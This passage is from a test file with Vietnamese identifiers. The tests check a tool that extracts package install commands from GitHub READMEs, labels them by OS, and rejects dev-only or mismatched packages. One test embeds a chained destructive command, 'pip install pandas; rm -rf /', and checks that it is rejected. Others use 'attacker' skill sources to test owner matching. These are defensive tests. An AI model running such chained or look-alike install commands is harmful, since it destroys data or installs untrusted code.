  it('nhận pip install nằm sau 4.000 ký tự dưới tiêu đề không phải "Installation" (pandas)', () => {
    const md = `# pandas\n\n${DEM}\n\n## Where to get it\n\n\`\`\`sh\n# conda\nconda install -c conda-forge pandas\n\`\`\`\n\n\`\`\`sh\n# or PyPI\npip install pandas\n\`\`\`\n\n## Installation from sources\n\n\`\`\`sh\npip install .\n\`\`\`\n`;

    expect(cach(md, 'pandas-dev/pandas')).toEqual(['pip:pandas']);
  });

  it('nhận lệnh npm trong hàng bảng dù có lệnh npx đứng trước (worldmonitor)', () => {
    const md = `${DEM}\n\n| **Terminal** | \`npx worldmonitor\` | docs |\n| **CLI** | \`npm install -g worldmonitor\` | docs |\n`;

    expect(cach(md, 'koala73/worldmonitor')).toEqual(['npm:worldmonitor']);
  });

  it('nhận lệnh nằm rất xa đầu README (OmniRoute)', () => {
    const md = `${DEM.repeat(30)}\n\n\`\`\`bash\nnpm install -g omniroute\n\`\`\`\n`;

    expect(cach(md, 'cheaper-inference/OmniRoute')).toEqual(['npm:omniroute']);
  });

  it('vẫn loại lệnh phát triển không có tên gói', () => {
    const md = `${DEM}\n\n\`\`\`bash\npip install -r requirements.txt\nnpm install\n\`\`\`\n`;

    expect(cach(md, 'owner/project')).toEqual([]);
  });

  it('loại gói có tên không khớp tên repo', () => {
    const md = `${DEM}\n\n\`\`\`bash\npip install torch\n\`\`\`\n`;

    expect(cach(md, 'Comfy-Org/ComfyUI')).toEqual([]);
  });

  it('không mở đường chèn lệnh: gói đúng tên nhưng nối lệnh khác vẫn bị từ chối', () => {
    const md = `${DEM}\n\n\`\`\`bash\npip install pandas; rm -rf /\n\`\`\`\n`;

    expect(cach(md, 'pandas-dev/pandas')).toEqual([]);
  });

  it('tenGoiKhopTenRepo: bằng nhau, chứa nhau khi đủ dài, loại tên quá ngắn', () => {
    expect(tenGoiKhopTenRepo('plotly.js-dist-min', 'plotly.js')).toBe(true);
    expect(tenGoiKhopTenRepo('BurntSushi.ripgrep.MSVC', 'ripgrep')).toBe(true);
    expect(tenGoiKhopTenRepo('torch', 'ComfyUI')).toBe(false);
    expect(tenGoiKhopTenRepo('go', 'golang')).toBe(false);
  });
});

describe('P3B-34: docker run nhiều dòng (AutoGPT)', () => {
  it('nhận docker run nhiều dòng có \\ cuối dòng (AutoGPT)', () => {
    const md = `
# AutoGPT
An autonomous GPT-4 experiment.

## Installation

\`\`\`bash
docker run -d \\
  -p 3000:3000 \\
  significantgravitas/autogpt:latest
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(
      md,
      'https://github.com/Significant-Gravitas/AutoGPT',
    );
    expect(res).not.toBeNull();
    const dockerCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.DOCKER);
    expect(dockerCach).toBeDefined();
    expect(dockerCach?.tenGoi).toBe('significantgravitas/autogpt:latest');
    expect(dockerCach?.trinhQuanLy).toBe('docker');
    expect(dockerCach?.buoc[0]?.lenh).toContain('significantgravitas/autogpt:latest');
  });

  it('nhận đúng khối docker run nguyên văn của AutoGPT (kèm --shm-size, --ulimit, --log-driver, --log-opt)', () => {
    const mdAutoGpt = `
### Self-host AutoGPT

The quickest way to self-host is the single-container image on
Docker Hub, [\`significantgravitas/autogpt\`](https://hub.docker.com/r/significantgravitas/autogpt):

\`\`\`bash
docker run -d \\
  --name autogpt \\
  --restart unless-stopped \\
  --shm-size 2g \\
  --ulimit nofile=65536:65536 \\
  --log-driver json-file \\
  --log-opt max-size=50m \\
  --log-opt max-file=5 \\
  -p 127.0.0.1:3000:3000 \\
  -e AUTOGPT_PUBLIC_URL=http://localhost:3000 \\
  -v autogpt-data:/data \\
  significantgravitas/autogpt:latest
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(
      mdAutoGpt,
      'https://github.com/Significant-Gravitas/AutoGPT',
    );
    expect(res).not.toBeNull();
    expect(coCachCaiCliHopLe(res)).toBe(true);
    const dockerCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.DOCKER);
    expect(dockerCach?.tenGoi).toBe('significantgravitas/autogpt:latest');
  });

  it('P3B-35: ưu tiên gói khớp tên repo và coi torch==... là bước chuẩn bị (k2-fsa/OmniVoice và SWivid/F5-TTS)', () => {
    // 1. k2-fsa/OmniVoice: có pip install torch==2.8.0+cu128 ... trước dòng pip install omnivoice
    const mdOmniVoice = `
## Installation

Choose **one** of the following methods: **pip** or **uv**.

### pip

**Step 1**: Install PyTorch

\`\`\`bash
# Install pytorch with your CUDA version, e.g.
pip install torch==2.8.0+cu128 torchaudio==2.8.0+cu128 --extra-index-url https://download.pytorch.org/whl/cu128
\`\`\`

**Step 2**: Install OmniVoice (choose one)

\`\`\`bash
# From PyPI (stable release)
pip install omnivoice

# From the latest source on GitHub (no need to clone)
pip install git+https://github.com/k2-fsa/OmniVoice.git
\`\`\`
`;
    const resOmni = trichXuatHuongDanCliBangQuyTac(
      mdOmniVoice,
      'https://github.com/k2-fsa/OmniVoice',
    );
    expect(resOmni).not.toBeNull();
    expect(coCachCaiCliHopLe(resOmni)).toBe(true);
    const pipOmni = resOmni?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
    expect(pipOmni?.tenGoi).toBe('omnivoice');

    // 2. SWivid/F5-TTS: có pip install torch==... trước pip install f5-tts
    const mdF5 = `
## Installation

### Install PyTorch with matched device

\`\`\`bash
# Install pytorch with your CUDA version, e.g.
pip install torch==2.8.0+cu128 torchaudio==2.8.0+cu128 --extra-index-url https://download.pytorch.org/whl/cu128
\`\`\`

### Then you can choose one from below:

\`\`\`bash
pip install f5-tts
\`\`\`
`;
    const resF5 = trichXuatHuongDanCliBangQuyTac(mdF5, 'https://github.com/SWivid/F5-TTS');
    expect(resF5).not.toBeNull();
    expect(coCachCaiCliHopLe(resF5)).toBe(true);
    const pipF5 = resF5?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
    expect(pipF5?.tenGoi).toBe('f5-tts');
  });

  it('P3B-35 (Mục A review lần 3): khi không có gói khớp tên repo, chỉ nhận gói ở dòng đầu (ChatTTS, vlang/v, Mouser)', () => {
    // 1. 2noise/ChatTTS: mục Install requirements có dòng đầu pip install --upgrade -r requirements.txt
    // và dòng sau pip install safetensors vllm==0.2.7 torchaudio -> không nhận safetensors, để quét toàn README lấy ChatTTS
    const mdChatTTS = `
### Install requirements
#### 1. Install Directly
\`\`\`bash
pip install --upgrade -r requirements.txt
\`\`\`

#### 2. Install from conda
\`\`\`bash
conda create -n chattts python=3.11
conda activate chattts
pip install -r requirements.txt
\`\`\`

#### Optional: Install vLLM (Linux only)
\`\`\`bash
pip install safetensors vllm==0.2.7 torchaudio
\`\`\`

## Usage
\`\`\`bash
pip install ChatTTS
\`\`\`
`;
    const resChatTTS = trichXuatHuongDanCliBangQuyTac(
      mdChatTTS,
      'https://github.com/2noise/ChatTTS#readme',
    );
    expect(coCachCaiCliHopLe(resChatTTS)).toBe(true);
    const pipChatTTS = resChatTTS?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
    expect(pipChatTTS?.tenGoi).toBe('ChatTTS');

    // 2. vlang/v: nhóm Docker có dòng đầu thevlang/vlang:latest kèm -v "$PWD":/src và dòng thứ hai vlang:latest
    const mdVlang = `
## Installing V from source

### Docker

Official images for V are published as [\`thevlang/vlang\`](https://hub.docker.com/r/thevlang/vlang),
built from [\`vlang/docker\`](https://github.com/vlang/docker):

\`\`\`bash
docker run --rm -it -v "$PWD":/src -w /src thevlang/vlang:latest
\`\`\`

To build one locally instead:

\`\`\`bash
git clone --depth=1 https://github.com/vlang/v
cd v
docker build -t vlang .
docker run --rm -it vlang:latest
\`\`\`
`;
    const resVlang = trichXuatHuongDanCliBangQuyTac(mdVlang, 'https://github.com/vlang/v#readme');
    expect(coCachCaiCliHopLe(resVlang)).toBe(true);
    const dockerVlang = resVlang?.cachCai.find((c) => c.nhom === NhomCachCai.DOCKER);
    expect(dockerVlang?.tenGoi).toBe('thevlang/vlang:latest');

    // 3. TomBadash/Mouser: dòng đầu pip install -r requirements.txt, dòng sau pip install pyinstaller -> không nhận pyinstaller
    const mdMouser = `
## Getting Started

\`\`\`bash
pip install -r requirements.txt
pip install pyinstaller
\`\`\`
`;
    const resMouser = trichXuatHuongDanCliBangQuyTac(
      mdMouser,
      'https://github.com/TomBadash/Mouser#readme',
    );
    expect(coCachCaiCliHopLe(resMouser)).toBe(false);
  });

  it('nhận docker run nhiều dòng bản dài có --name, -v, -p', () => {
    const md = `
## Setup
\`\`\`bash
docker run -d \\
  --name autogpt \\
  -p 3000:3000 \\
  -v ./data:/app/data \\
  significantgravitas/autogpt:latest
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(
      md,
      'https://github.com/Significant-Gravitas/AutoGPT',
    );
    expect(res).not.toBeNull();
    const dockerCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.DOCKER);
    expect(dockerCach?.tenGoi).toBe('significantgravitas/autogpt:latest');
  });

  it('nhận docker run nối dòng bằng backtick PowerShell', () => {
    const md = `
## Quick Start
\`\`\`powershell
docker run -d \`
  -p 8080:80 \`
  nginx:alpine
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/nginx/nginx');
    expect(res).not.toBeNull();
    const dockerCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.DOCKER);
    expect(dockerCach?.tenGoi).toBe('nginx:alpine');
  });

  it('không nhận nhầm docker exec hoặc các lệnh nhiều dòng khác', () => {
    const md = `
## Debug
\`\`\`bash
docker exec -it \\
  my-container \\
  sh
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/test/repo');
    expect(res).toBeNull();
  });
});

describe('P3B-35: pip/uv ghim phiên bản, [extras], và nhãn hệ điều hành chuẩn', () => {
  it('bóc tên gói PIP khi ghim phiên bản ==, >=, <=, ~=, != và có dấu nháy (browser-use)', () => {
    const mau = [
      ["pip install 'browser-use==1.0.1'", 'browser-use'],
      ['pip install "browser-use==1.0.1"', 'browser-use'],
      ['pip install browser-use==1.0.1', 'browser-use'],
      ["uv add 'browser-use==1.0.1'", 'browser-use'],
      ['uv tool install browser-use==1.0.1', 'browser-use'],
      ['pip install pkg>=2.0.0,<=3.0.0', 'pkg'],
      ['pip install "pkg~=1.4.2"', 'pkg'],
      ["pip install 'pkg!=1.0.0'", 'pkg'],
    ];

    for (const [lenh, tenGoiMongDoi] of mau) {
      const md = `## Installation\n\`\`\`bash\n${lenh}\n\`\`\``;
      const res = trichXuatHuongDanCliBangQuyTac(md);
      expect(res).not.toBeNull();
      const pipCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
      expect(pipCach?.trinhQuanLy).toBe('pip');
      expect(pipCach?.tenGoi).toBe(tenGoiMongDoi);
      // Lệnh hiển thị cho người dùng giữ nguyên chuỗi gốc
      expect(pipCach?.buoc[0]?.lenh).toBe(lenh);
    }
  });

  it('bóc tên gói PIP khi có [extras] kèm hoặc không kèm phiên bản (pr-agent)', () => {
    const mau = [
      ['pip install "pr-agent[github]"', 'pr-agent'],
      ["pip install 'pr-agent[github]'", 'pr-agent'],
      ['pip install pr-agent[github]', 'pr-agent'],
      ['pip install "pkg[extra]==1.0"', 'pkg'],
      ["pip install 'pkg[extra1,extra2]>=2.0'", 'pkg'],
    ];

    for (const [lenh, tenGoiMongDoi] of mau) {
      const md = `## Installation\n\`\`\`bash\n${lenh}\n\`\`\``;
      const res = trichXuatHuongDanCliBangQuyTac(md);
      expect(res).not.toBeNull();
      const pipCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
      expect(pipCach?.tenGoi).toBe(tenGoiMongDoi);
      expect(pipCach?.buoc[0]?.lenh).toBe(lenh);
    }
  });

  it('vẫn loại trừ lệnh phát triển pip install -r requirements.txt và pip install .', () => {
    const md = `## Installation\n\`\`\`bash\npip install -r requirements.txt\npip install .\n\`\`\``;
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/owner/repo');
    // Không có cách cài nào hợp lệ (không có trinhQuanLy và tenGoi)
    expect(coCachCaiCliHopLe(res)).toBe(false);
  });

  it('README pr-agent đầy đủ không bị nhãn YAML CI/CD kéo sang LINUX_MAC (ra DUNG_CHUNG)', () => {
    const prAgentReadme = `
# PR-Agent
An AI-powered tool for automated pull request review.

## CI/CD Workflow
\`\`\`yaml
name: Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
\`\`\`

## Installation

\`\`\`bash
pip install "pr-agent[github]"
\`\`\`

## Configuration
Set OPENAI_KEY in your env.
`;
    const res = trichXuatHuongDanCliBangQuyTac(
      prAgentReadme,
      'https://github.com/The-PR-Agent/pr-agent',
    );
    expect(res).not.toBeNull();
    const pipCach = res?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
    expect(pipCach).toBeDefined();
    expect(pipCach?.tenGoi).toBe('pr-agent');
    // Phải là DUNG_CHUNG, không được bị runs-on: ubuntu-latest kéo sang LINUX_MAC
    expect(pipCach?.heDieuHanh).toBe(HeDieuHanhCli.DUNG_CHUNG);
  });

  it('lệnh WINGET và SCOOP luôn mang nhãn WINDOWS kể cả khi ngữ cảnh có chữ Linux/Ubuntu', () => {
    const md = `
## Installation for Linux, Ubuntu and Windows

\`\`\`bash
winget install Fastfetch-cli.Fastfetch
scoop install fastfetch
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/fastfetch-cli/fastfetch');
    expect(res).not.toBeNull();
    for (const cach of res?.cachCai || []) {
      expect(cach.heDieuHanh).toBe(HeDieuHanhCli.WINDOWS);
    }
  });

  it('Mục C review lần 3: bỏ chú thích cuối dòng và dùng ranh giới chữ chặt cho nhãn hệ điều hành', () => {
    // PerryTS/perry: chú thích "# or: brew install ..." không được kéo nhãn sang LINUX_MAC
    expect(
      xacDinhHeDieuHanhLenh(
        'npm install -g @perryts/perry     # or: brew install perryts/perry/perry',
      ),
    ).toBe(HeDieuHanhCli.DUNG_CHUNG);
    // Tên gói / đường dẫn có gạch ngang không phải lệnh Unix
    expect(xacDinhHeDieuHanhLenh('pip install sudo-tool')).toBe(HeDieuHanhCli.DUNG_CHUNG);
    expect(xacDinhHeDieuHanhLenh('docker run sameersbn/apt-cacher-ng')).toBe(
      HeDieuHanhCli.DUNG_CHUNG,
    );
    // Lệnh Unix thật vẫn đúng nhãn, kể cả khi có từ powershell
    expect(xacDinhHeDieuHanhLenh('brew install --cask powershell')).toBe(HeDieuHanhCli.LINUX_MAC);
    expect(xacDinhHeDieuHanhLenh('sudo apt install git build-essential')).toBe(
      HeDieuHanhCli.LINUX_MAC,
    );
    expect(xacDinhHeDieuHanhLenh('winget install Foo.Bar')).toBe(HeDieuHanhCli.WINDOWS);
  });
  it('lệnh dưới tiêu đề Linux / macOS nhận nhãn LINUX_MAC chuẩn xác', () => {
    const md = `
## Installation

### Linux / macOS
\`\`\`bash
pip install my-tool
\`\`\`

### Windows
\`\`\`powershell
pip install my-tool
\`\`\`
`;
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/owner/my-tool');
    expect(res).not.toBeNull();
    // Tiêu đề Linux / macOS -> DUNG_CHUNG vì pip là trình quản lý đa nền tảng (Mục 7 review 11/11)
    expect(
      xacDinhHeDieuHanhLenh('pip install my-tool', '### Linux / macOS\npip install my-tool'),
    ).toBe(HeDieuHanhCli.DUNG_CHUNG);
    // Tiêu đề Windows -> WINDOWS
    expect(xacDinhHeDieuHanhLenh('pip install my-tool', '### Windows\npip install my-tool')).toBe(
      HeDieuHanhCli.WINDOWS,
    );
    // Lệnh nguồn make install -> nhận LINUX_MAC từ tiêu đề Linux
    expect(xacDinhHeDieuHanhLenh('make install', '### Linux / macOS\nmake install')).toBe(
      HeDieuHanhCli.LINUX_MAC,
    );
  });
});

describe('P3B-33: Nhóm skill trợ lý AI cài bằng npx (D-38)', () => {
  it('npx không sinh lệnh cập nhật/gỡ giả (npx <gói> là lệnh CHẠY gói, không phải cập nhật)', () => {
    const md = '## Installation\n```bash\nnpx skills add mattpocock/skills\n```\n';
    const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/mattpocock/skills');
    const cach = res?.cachCai[0];
    expect(cach?.lenhCapNhat || '').toBe('');
    expect(cach?.lenhGo || '').toBe('');
  });

  it('nhận đúng 3 repo skill AI: mattpocock/skills, pbakaus/impeccable, cloudflare/security-audit-skill', () => {
    // 1. mattpocock/skills: npx skills@latest add mattpocock/skills -a <agent>  # ...
    const mdSkills = `
<summary><strong>Any other agent, or editable files</strong> (manual updates)</summary>

\`\`\`bash
npx skills@latest add mattpocock/skills -a <agent>  # cursor, opencode, devin, windsurf, amp, pi; omit -a to choose
\`\`\`
`;
    const resSkills = trichXuatHuongDanCliBangQuyTac(
      mdSkills,
      'https://github.com/mattpocock/skills',
    );
    expect(resSkills).not.toBeNull();
    expect(coCachCaiCliHopLe(resSkills)).toBe(true);
    expect(resSkills?.cachCai[0]?.tenGoi).toBe('mattpocock/skills');

    // 2. pbakaus/impeccable: npx impeccable install
    const mdImpeccable = `
# Impeccable
Design guidance for AI agents and code generators.

## Setup
\`\`\`bash
npx impeccable install
\`\`\`
`;
    const resImpeccable = trichXuatHuongDanCliBangQuyTac(
      mdImpeccable,
      'https://github.com/pbakaus/impeccable',
    );
    expect(resImpeccable).not.toBeNull();
    expect(coCachCaiCliHopLe(resImpeccable)).toBe(true);
    expect(resImpeccable?.cachCai[0]?.tenGoi).toBe('impeccable');

    // 3. cloudflare/security-audit-skill: npx skills add https://github.com/... \
    const mdCloudflare = `
Install the skill with the [Skills CLI](https://skills.sh):

\`\`\`bash
npx skills add https://github.com/cloudflare/security-audit-skill \\
  --skill security-audit
\`\`\`

Use \`--global\` for a user-level installation:

\`\`\`bash
npx skills add https://github.com/cloudflare/security-audit-skill \\
  --skill security-audit \\
  --global
\`\`\`
`;
    const resCloudflare = trichXuatHuongDanCliBangQuyTac(
      mdCloudflare,
      'https://github.com/cloudflare/security-audit-skill',
    );
    expect(resCloudflare).not.toBeNull();
    expect(coCachCaiCliHopLe(resCloudflare)).toBe(true);
    expect(resCloudflare?.cachCai[0]?.tenGoi).toBe('cloudflare/security-audit-skill');

    // Chốt chặn D-38: URL của repo khác trong README bị từ chối
    const resKhac = trichXuatHuongDanCliBangQuyTac(
      mdCloudflare,
      'https://github.com/someone-else/different-repo',
    );
    expect(coCachCaiCliHopLe(resKhac)).toBe(false);
  });

  it('Mục B review lần 3: đích owner/name bắt buộc trùng chủ repo (D-38)', () => {
    const cach = (lenh: string, repo: string) =>
      trichXuatHuongDanCliBangQuyTac(
        `## Installation\n\`\`\`bash\n${lenh}\n\`\`\`\n`,
        `https://github.com/${repo}#readme`,
      );
    // Giữ được: README thật của các repo skill
    expect(
      cach('npx skills add debpalash/VoiceStudio', 'debpalash/VoiceStudio')?.cachCai[0]?.tenGoi,
    ).toBe('debpalash/VoiceStudio');
    expect(
      cach('npx skills add longbridge/gpui-kit', 'longbridge/gpui-kit')?.cachCai[0]?.tenGoi,
    ).toBe('longbridge/gpui-kit');
    expect(
      cach('npx skills add rendercv/rendercv-skill', 'rendercv/rendercv')?.cachCai[0]?.tenGoi,
    ).toBe('rendercv/rendercv-skill');
    // Phải loại: repo khác chủ hoặc tên chỉ chứa nhau
    expect(coCachCaiCliHopLe(cach('npx skills add attacker/bar', 'foo/bar'))).toBe(false);
    expect(coCachCaiCliHopLe(cach('npx skills add PicGo/skills', 'Molunerfinn/PicGo'))).toBe(false);
    expect(
      coCachCaiCliHopLe(cach('npx skills add vercel-labs/agent-skills', 'vercel-labs/skills')),
    ).toBe(false);
    expect(
      coCachCaiCliHopLe(cach('npx skills add https://github.com/attacker/bar-skills', 'foo/bar')),
    ).toBe(false);
  });
  it('vẫn loại trừ lệnh chạy dev (npx vite, npx create-react-app)', () => {
    // A. npx vite
    const mdVite = `
## Getting Started
\`\`\`bash
npx vite
\`\`\`
`;
    const resVite = trichXuatHuongDanCliBangQuyTac(mdVite, 'https://github.com/vitejs/vite');
    expect(coCachCaiCliHopLe(resVite)).toBe(false);

    // B. npx create-react-app my-app ở repo khác
    const mdCra = `
## Quick Start
\`\`\`bash
npx create-react-app my-app
\`\`\`
`;
    const resCra = trichXuatHuongDanCliBangQuyTac(mdCra, 'https://github.com/owner/some-tutorial');
    expect(coCachCaiCliHopLe(resCra)).toBe(false);
  });

  it('vẫn loại trừ repo chỉ chạy từ mã nguồn kiểu OpenManus (git clone + pip install -r)', () => {
    const mdOpenManus = `
# OpenManus
An open-source replication of Manus AI.

## Installation
\`\`\`bash
git clone https://github.com/FoundationAgents/OpenManus.git
cd OpenManus
pip install -r requirements.txt
python main.py
\`\`\`
`;
    const resOpenManus = trichXuatHuongDanCliBangQuyTac(
      mdOpenManus,
      'https://github.com/FoundationAgents/OpenManus',
    );
    expect(coCachCaiCliHopLe(resOpenManus)).toBe(false);
  });
});
